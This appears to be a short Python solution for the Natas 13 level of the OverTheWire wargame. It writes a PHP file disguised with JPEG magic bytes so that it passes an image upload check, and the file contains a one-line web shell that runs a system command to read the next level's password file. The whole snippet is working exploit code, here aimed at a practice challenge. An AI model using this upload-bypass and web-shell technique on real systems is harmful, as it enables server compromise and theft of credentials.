file = open("script.php", "w")
file.write("\xFF\xD8\xFF\xE0" + "<? echo system('cat /etc/natas_webpass/natas14') ?>")
file.close()
